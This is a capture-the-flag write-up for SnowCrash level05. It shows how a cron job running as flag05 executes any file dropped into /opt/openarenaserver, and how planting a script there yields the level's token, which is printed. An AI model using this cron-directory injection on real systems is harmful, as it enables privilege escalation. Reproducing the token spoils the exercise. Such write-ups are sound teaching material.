We received an email as level05 at login

> level05@SnowCrash:~$ cat /var/mail/level05
> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

It is a crontab configuration telling that the script openarenaserver is ran every minute

List all file owned by flag05

> level05@SnowCrash:~$ find / -user flag05 2>/dev/null
> /usr/sbin/openarenaserver
> /rofs/usr/sbin/openarenaserver
> level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
> #!/bin/sh
>
> for i in /opt/openarenaserver/* ; do
>         (ulimit -t 5; bash -x "$i")
>         rm -f "$i"
> done

It is a script that execute every file in `/opt/openarenaserver/` and delete them
It is ran every minute

We just need to add a script in there to be executed by the flag05 user

```
#!/bin/bash

getflag > /tmp/flag
```
`chmod +x <your file>`
place it in `/opt/openarenaserver/` and wait the script to be executed

> Check flag.Here is your token : viuaaale9huek52boumoomioc
